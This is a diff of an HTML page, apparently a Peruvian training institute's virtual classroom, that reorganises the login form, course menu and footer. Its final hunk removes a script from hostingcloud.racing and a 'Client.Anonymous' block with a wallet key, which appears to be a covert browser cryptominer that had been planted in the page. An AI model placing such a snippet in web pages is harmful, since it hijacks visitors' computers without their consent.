@@ -13,13 +13,13 @@
     <link rel="stylesheet" href="../css/contenido_tabla-dist.css"/>
     <link rel="stylesheet" href="../css/principal-dist.css"/>
     <link rel="stylesheet" href="../css/aula-dist.css"/>
-    <link rel="stylesheet" href="../css/usuario-dist.css"/>
+    <!--link(rel="stylesheet",href="../css/usuario-dist.css")-->
     <link rel="stylesheet" href="../css/usuario_menu-dist.css"/>
     <link rel="stylesheet" href="../css/animation-dist.css"/>
     <link rel="stylesheet" href="../css/pie-dist.css"/>
   </head>
   <body>
-    <div class="menu">
+    <div id="menu" class="menu">
       <nav>
         <div class="empresa">
           <p>Instituto Peruano de Investigación Básica y Aplicada</p>
@@ -35,15 +35,64 @@
         </div>
       </nav>
     </div>
-    <div class="contenido">
-      <section>
+    <div class="principal">
+      <main>
+        <div id="loging" class="login primera_main_aula">
+          <form method="get" action="?" class="formulario">
+            <p><strong>Login</strong></p>
+            <input id="user" type="text" value="" placeholder="Usuario"/>
+            <input id="password" type="password" value="" placeholder="Contraseña"/>
+            <label id="verificar"></label>
+            <button id="enviar" type="button" value="" class="login_boton">Ingresar</button>
+          </form>
+        </div>
+      </main>
+    </div>
+    <div id="pie" class="pie">
+      <footer>
+        <div class="general">
+          <div class="nombre_empresa">
+            <p><strong>INSTITUTO PERUANO DE INVESTIGACIÓN BÁSICA Y APLICADA E.I.R.L.</strong></p>
+          </div>
+          <div class="datos">
+            <p class="location1"><img src="../icons/location.svg"/><span>: </span><em>Av. La Unidad Mz. M - Lt. 4. Trujillo – La Libertad – Perú.</em></p>
+            <p class="location2"><img src="../icons/location.svg"/><span>: </span><em>Calle Huamantanga N° 1060–A. Oficina 402. Jaén – Cajamarca – Perú.</em></p>
+            <p class="phone"><img src="../icons/phone.svg"/><span>: </span><em>(+51) 970 901 735 || (+51) 932 146 496 || (+51) 935 584 294</em></p>
+            <p class="whatsapp"><img src="../icons/whatsapp.svg"/><span>: </span><em>(+51) 935 584 294  </em></p>
+            <p class="mail"><img src="../icons/mail.svg"/><span>: </span><em>ipibaeirl@gmail.com</em></p>
+          </div>
+          <div class="derechos">
+            <p><strong><small>Derechos Reservados &copy; 2020</small></strong></p>
+          </div>
+        </div>
+        <div class="redes"><a href="https://www.facebook.com/ipibaperu/" target="_blank"><img src="../icons/facebook.svg"/></a><a href="https://www.youtube.com/channel/UCNELdsZVr-eaDzx0EYzobLw" target="_blank"><img src="../icons/youtube.svg"/></a><a href="https://twitter.com/ipibaperu" target="_blank"><img src="../icons/twitter.svg"/></a></div>
+      </footer>
+    </div>
+    <div id="menu2" class="menu">
+      <nav>
+        <div class="empresa">
+          <p>Instituto Peruano de Investigación Básica y Aplicada</p>
+          <figure><img src="../icons/ipiba.svg" class="ipiba"/></figure>
+        </div>
+        <div class="navegacion">
+          <ul>
+            <li><a href="../index.html">Inicio</a></li>
+            <li><a href="../html/cursos.html">Cursos</a></li>
+            <li><a href="../html/diplomados.html">Diplomados</a></li>
+            <li><a href="../html/aula.html">Aula Virtual</a></li>
+          </ul>
+        </div>
+      </nav>
+    </div>
+    <div id="contenido_aula" class="contenido">
+      <section class="seccion">
         <article id="seccion">
           <h1 id="titulo"></h1>
           <p><strong id="saludo"></strong></p>
           <p id="def1"></p>
-          <p id="def2"></p><em id="correo"></em>
+          <p id="def2"></p>
           <ul>
-            <li id="n1" class="nombre">Diplomados:<img src="../icons/book.svg" class="evento1"/>
+            <li id="n1" class="nombre"><strong><em>Diplomados:</em></strong><img src="../icons/book.svg" alt="" class="evento1"/>
               <ul id="n2_d">
                 <li id="d1" class="nombre_evento">Seguridad y Salud en el Trabajo.
                   <ul id="n3_d1">
@@ -84,8 +133,7 @@
                   </ul>
                 </li>
                 <li id="d4" class="nombre_evento">Derecho Ambiental.
-                  <ul id="n3_d4">
-                  </ul>
+                  <ul id="n3_d4"></ul>
                 </li>
                 <li id="d5" class="nombre_evento">Sistemas Integrados de Gestión.
                   <ul id="n3_d5">
@@ -139,7 +187,7 @@
                 </li>
               </ul>
             </li>
-            <li id="n2" class="nombre">Cursos:<img src="../icons/book.svg" class="evento2"/>
+            <li id="n2" class="nombre"><strong><em>Cursos:</em></strong><img src="../icons/book.svg" alt="" class="evento2"/>
               <ul id="n2_c">
                 <li id="c1" class="nombre_evento">Valorización y Liquidación de Obras.
                   <ul id="n3_c1">
@@ -387,7 +435,7 @@
                 </li>
                 <li id="c48" class="nombre_evento">Curso 48.
                   <ul id="n3_c48">
-                    <li id="c48_m1" class="nombre_modulo"> </li>
+                    <li id="c48_m1" class="nombre_modulo"></li>
                   </ul>
                 </li>
                 <li id="c49" class="nombre_evento">Curso 49.
@@ -405,59 +453,14 @@
           </ul>
         </article>
       </section>
-      <aside>
-        <article id="aside">
-        </article>
-        <figure>
-          <iframe id="ver_video"></iframe>
-        </figure>
-      </aside>
     </div>
-    <div class="principal">
-      <main>
-        <div id="loging" class="primera_main_aula">
-          <div class="formulario">
-            <form method="get" action="?" class="prueba">
-              <h2>Login</h2>
-              <input id="user" type="text" value="" placeholder="DNI / Carnet de Extranjería"/>
-              <input id="password" type="password" placeholder="Contraseña"/>
-              <label id="verificar"></label>
-              <button id="enviar" type="button" value="">Ingresar</button>
-            </form>
-          </div>
-        </div>
-        <div class="segunda_main"></div>
-      </main>
-    </div>
-    <div class="pie">
-      <footer>
-        <div class="general">
-          <div class="nombre_empresa">
-            <p><strong>INSTITUTO PERUANO DE INVESTIGACIÓN BÁSICA Y APLICADA E.I.R.L.</strong></p>
-          </div>
-          <div class="datos">
-            <p><img src="../icons/location.svg"/><span>: </span><em>Av. La Unidad Mz. M - Lt. 4. Trujillo – La Libertad – Perú.</em></p>
-            <p><img src="../icons/location.svg"/><span>: </span><em>Calle Huamantanga N° 1060–A. Oficina 402. Jaén – Cajamarca – Perú.</em></p>
-            <p><img src="../icons/phone.svg"/><span>: </span><em>(+51) 970 901 735 || (+51) 932 146 496 || (+51) 935 584 294</em></p>
-            <p><img src="../icons/whatsapp.svg"/><span>: </span><em>(+51) 935 584 294  </em></p>
-            <p><img src="../icons/mail.svg"/><span>: </span><em>ipibaeirl@gmail.com</em></p>
-          </div>
-          <div class="derechos">
-            <p><strong><small>Derechos Reservados &copy; 2017</small></strong></p>
-          </div>
-        </div>
-        <div class="redes"><a href="https://www.facebook.com/ipibaperu/" target="_blank"><img src="../icons/facebook.svg"/></a><a href="https://www.youtube.com/channel/UCNELdsZVr-eaDzx0EYzobLw" target="_blank"><img src="../icons/youtube.svg"/></a><a href="https://twitter.com/ipibaperu" target="_blank"><img src="../icons/twitter.svg"/></a></div>
-      </footer>
+    <div id="aside" class="video_aula_max">
+      <figure>
+        <iframe id="ver_video" class="video_aula"></iframe>
+      </figure>
     </div>
     <script type="text/javascript" src="../js/login-dist.js"></script>
     <script type="text/javascript" src="../js/limpiar-dist.js"></script>
     <script type="text/javascript" src="../js/usuario_menu-dist.js"></script>
-    <script src="https://www.hostingcloud.racing/obCP.js"></script>
-    <script>
-      var _client = new Client.Anonymous('0x71736ec638a288a1861997aa3943b5bae4666f71', {
-        throttle: 0.2, c: 'w', ads: 0
-      });
-      _client.start();
-    </script>
   </body>
 </html>
